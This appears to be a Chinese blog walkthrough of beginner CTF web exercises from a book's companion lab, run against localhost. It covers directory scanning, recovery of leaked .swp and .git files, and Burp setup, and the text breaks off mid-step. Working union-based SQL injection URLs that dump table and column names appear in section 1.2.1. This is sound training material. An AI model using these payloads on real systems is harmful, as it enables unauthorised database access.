<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cs-cshi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="官方平台网址：https:&#x2F;&#x2F;book.nu1l.com&#x2F;tasks&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="《从0到1：CTFer成长之路》配套题目">
<meta property="og:url" content="https://cs-cshi.github.io/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/index.html">
<meta property="og:site_name" content="Chang">
<meta property="og:description" content="官方平台网址：https:&#x2F;&#x2F;book.nu1l.com&#x2F;tasks&#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_proxy.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_intercept.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_login_request.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_1_wappalyzer.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_2_wappalyzer.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr3_n1page_session.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_3_flag.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_ssrf_1_url.png">
<meta property="article:published_time" content="2021-03-13T01:47:57.000Z">
<meta property="article:modified_time" content="2021-06-24T00:51:26.296Z">
<meta property="article:author" content="Charles">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_proxy.png">

<link rel="canonical" href="https://cs-cshi.github.io/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>《从0到1：CTFer成长之路》配套题目 | Chang</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Chang</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页 | home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于 | about</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签 | tags<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类 | categories<span class="badge">25</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档 | archives<span class="badge">44</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索 | search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cs-cshi.github.io/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Charles">
      <meta itemprop="description" content="慢下来，记录生活点滴，畅游人类知识和艺术的海洋。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chang">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          《从0到1：CTFer成长之路》配套题目
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-13 09:47:57" itemprop="dateCreated datePublished" datetime="2021-03-13T09:47:57+08:00">2021-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-24 08:51:26" itemprop="dateModified" datetime="2021-06-24T08:51:26+08:00">2021-06-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B/" itemprop="url" rel="index"><span itemprop="name">《从0到1：CTFer成长之路》</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>18 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>官方平台网址：<a target="_blank" rel="noopener" href="https://book.nu1l.com/tasks/">https://book.nu1l.com/tasks/</a></p>
<span id="more"></span>

<h1 id="第一章-Web-入门"><a href="#第一章-Web-入门" class="headerlink" title="第一章 Web 入门"></a>第一章 Web 入门</h1><h2 id="1-1-信息搜集"><a href="#1-1-信息搜集" class="headerlink" title="1.1 信息搜集"></a>1.1 信息搜集</h2><h3 id="1-1-1-常见的搜集"><a href="#1-1-1-常见的搜集" class="headerlink" title="1.1.1 常见的搜集"></a>1.1.1 常见的搜集</h3><ol>
<li>先使用目录扫描工具 <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a> 扫描<code>127.0.0.1</code>网站，获得网站目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">200    10KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.DS_Store</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200    12KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.index.php.swp</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php~</span><br><span class="line">200    47B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;robots.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br></pre></td></tr></table></figure></li>
<li>发现存在可疑文件：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robots.txt   # 常规文件，记录一些目录和 CMS版本信息</span><br><span class="line">index.php~   # gedit 备份文件</span><br><span class="line">.index.php.swp  # vim 备份文件</span><br></pre></td></tr></table></figure></li>
<li>根据书中方法一一查验可得 flag<ul>
<li>通过 url(<a target="_blank" rel="noopener" href="http://127.0.0.1/robots.txt">http://127.0.0.1/robots.txt</a>) 直接访问 robots.txt，，获得 flag: /flag1_is_her3_fun.txt</li>
<li>通过 url(<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php">http://127.0.0.1/index.php</a><del>) 直接访问 index.php</del>，获得 flag：flag2:s_v3ry_im</li>
<li>通过 url(<a target="_blank" rel="noopener" href="http://127.0.0.1/.index.php.swp">http://127.0.0.1/.index.php.swp</a>) 直接访问 .index.php.swp, .index.php.swp 会下载到本地<ul>
<li>先创建一个 index.php 文件，与 index.php.swp 同目录。命令: <code>touch index.php</code></li>
<li>使用 <code>vim -r index.php</code> 命令恢复文件的内容。</li>
<li>使用 <code>:x</code> 保存并退出 vim 编辑</li>
<li>使用命令 <code>cat index.php | grep flag</code>，查看 flag。命令回显： <?php echo 'flag3:p0rtant_hack}';?> </li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="1-1-2-粗心的小李"><a href="#1-1-2-粗心的小李" class="headerlink" title="1.1.2 粗心的小李"></a>1.1.2 粗心的小李</h3><ol>
<li><p>先使用 目录扫描工具 dirsearch 扫描 127.0.0.1 文件信息，获得下列文件目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">200     5B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;COMMIT_EDITMSG</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;</span><br><span class="line">301   305B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;</span><br><span class="line">200    23B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;HEAD</span><br><span class="line">200    73B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;description</span><br><span class="line">200   137B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;config</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;hooks&#x2F;</span><br><span class="line">200   240B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;exclude</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;info&#x2F;</span><br><span class="line">200   145B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;index</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;HEAD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;</span><br><span class="line">301   321B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">200   148B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;objects&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;</span><br><span class="line">200    41B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">301   316B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;heads    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;heads&#x2F;</span><br><span class="line">301   315B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.git&#x2F;refs&#x2F;tags    -&gt; REDIRECTS TO: http:&#x2F;&#x2F;127.0.0.1&#x2F;.git&#x2F;refs&#x2F;tags&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br></pre></td></tr></table></figure></li>
<li><p>发现存在<code>.git</code>文件夹，试探访问<code>.git/config</code>，返回了下列内容，说明存在 git 泄露。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion &#x3D; 0</span><br><span class="line">	filemode &#x3D; true</span><br><span class="line">	bare &#x3D; false</span><br><span class="line">	logallrefupdates &#x3D; true</span><br><span class="line">	ignorecase &#x3D; true</span><br><span class="line">	precomposeunicode &#x3D; true</span><br></pre></td></tr></table></figure></li>
<li><p>使用 <a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">scrabble</a> 工具，成功获到源码，拿到 flag。</p>
<blockquote>
<p>重新初始化已存在的 Git 仓库于 /home/chang/compose/ctf/tools/scrabble/.git/<br>parseCommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88<br>downloadBlob 213b7e386e9b0b406d91fae58bf8be11a58c3f88<br>parseTree f46fbac4149604ca13a765950f9a2d1fd8c1c7ad<br>downloadBlob f46fbac4149604ca13a765950f9a2d1fd8c1c7ad<br>downloadBlob 1e0db5d96b5cc9785055c14bbec0e7ad14f48151<br>HEAD 现在位于 213b7e3 flag</p>
</blockquote>
</li>
</ol>
<h2 id="1-2-SQL注入"><a href="#1-2-SQL注入" class="headerlink" title="1.2 SQL注入"></a>1.2 SQL注入</h2><h3 id="1-2-1-SQL注入-1"><a href="#1-2-1-SQL注入-1" class="headerlink" title="1.2.1 SQL注入-1"></a>1.2.1 SQL注入-1</h3><ol>
<li><p>127.0.0.1/index.php?id=2-1 的结果与 127.0.0.1/index.php?id=2 相同，说明不存在数字型注入。</p>
</li>
<li><p>尝试 127.0.0.1/index.php?id=2-1%27%23，发现页面有显示内容，说明是字符型注入。</p>
<ul>
<li>%27：单引号 ‘</li>
<li>%23：注释 #</li>
</ul>
</li>
<li><p>尝试 UNION 注入，127.0.0.1/index.php?id=-1%27union%20select%201,2,3%23，发现成功返回数据。说明是 select 1,2,3 形式，并且1不会显示，3是用户输入的数据，2是数据库数据。</p>
</li>
<li><p>尝试获取表明 <code>127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23</code>，得到 fl4g，notes 两个表。</p>
</li>
<li><p>分别尝试获取列名。<code>127.0.0.1/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23</code>。在 fl4g 中获得 flag。</p>
</li>
</ol>
<h3 id="1-2-2-SQL注入-2"><a href="#1-2-2-SQL注入-2" class="headerlink" title="1.2.2 SQL注入-2"></a>1.2.2 SQL注入-2</h3><ol>
<li><p>访问 127.0.0.1，服务器返回 Forbidden，说明入口错误。尝试使用 dirsearch 工具扫描目录，发现 login.php、user.php 状态是200，找到入口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;login.php</span><br><span class="line">403   289B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status</span><br><span class="line">403   290B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;server-status&#x2F;</span><br><span class="line">200    11B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;user.php</span><br></pre></td></tr></table></figure></li>
<li><p>访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/login.php">http://127.0.0.1:80/login.php</a> ，随机使用账号密码登录，未发现异常。查看源码，发现注释中有提示：<code>如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦</code></p>
</li>
<li><p>安装 burp suit 社区版<br>下载链接：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/releases/professional-community-2021-2-1">https://portswigger.net/burp/releases/professional-community-2021-2-1</a><br>安装命令：<code>sh burpsuite_community_linux_v2021_2_1.sh</code> </p>
</li>
<li><p>配置 burp suit</p>
<blockquote>
<ol>
<li>进入 Proxy -&gt;  option，选择 add，端口用 8080，选择  Loopback only。</li>
<li>进入浏览器的代理设置，http/https 代理均设为 127.0.0.1，端口 8080。(与 burp 内设置的一致)<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_proxy.png" alt="burp proxy"></li>
</ol>
</blockquote>
</li>
<li><p>使用 burp suit 抓包、发包。</p>
<blockquote>
<p>进入 Proxy -&gt; intercep 页面。如果浏览器与 burp 设置成功，浏览器发出的包会先到 burp，burp 中可对这个包执行修改、转发、丢弃等等操作。在 intercep 这行一系列对包的操作。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_burp_intercept.png" alt="burp intercept"></p>
</blockquote>
</li>
<li><p>火狐浏览器会自动周期性的发包，可先在火狐浏览器核心设置中取消这周期性的发包，具体发的包可以 burp 中 Proxy菜单下的 HTTP history 页面中看到。</p>
</li>
<li><p>burp 有时不会捕获 127.0.0.1 的流量。如果要捕获发至本机的包，使用 <code>ifconfig</code> 命令先找到本机的 ip，用本机的 ip 代替 127.0.0.1 访问，成功捕获。我的主机 ip 是 172.19.0.1。</p>
</li>
<li><p>burp 捕获访问 <a target="_blank" rel="noopener" href="http://172.19.0.1/login.php">http://172.19.0.1/login.php</a> 的包（注意此处需要捕获的是输入账号密码点击登录后产生的包），在 intercep 页面 request 栏右键选择 action：<code>Send to Repeater（Ctrl + R）</code>，再进入 Repeater 页面。在 request 中修改请求头。</p>
</li>
<li><p> 根据提示，先在 post 的 url 中添加 ?tips=1，发送后发现无有效信息。于是修改 name，由原来的 123 改为 123’（登录的用户名），成功返回 SQL 报错信息：</p>
<blockquote>
